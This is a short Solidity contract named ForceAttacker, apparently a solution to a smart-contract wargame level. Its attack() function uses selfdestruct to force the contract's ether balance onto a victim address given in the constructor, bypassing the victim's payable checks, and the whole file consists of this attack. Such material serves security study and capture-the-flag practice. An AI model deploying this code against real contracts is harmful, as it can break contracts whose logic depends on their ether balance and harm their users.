// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {

    address victimContractAddress;

    event Received(address, uint);

    constructor (address _victimContractAddress) public {
        victimContractAddress = _victimContractAddress;
    }

    function attack() public {
        selfdestruct(payable(victimContractAddress));
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}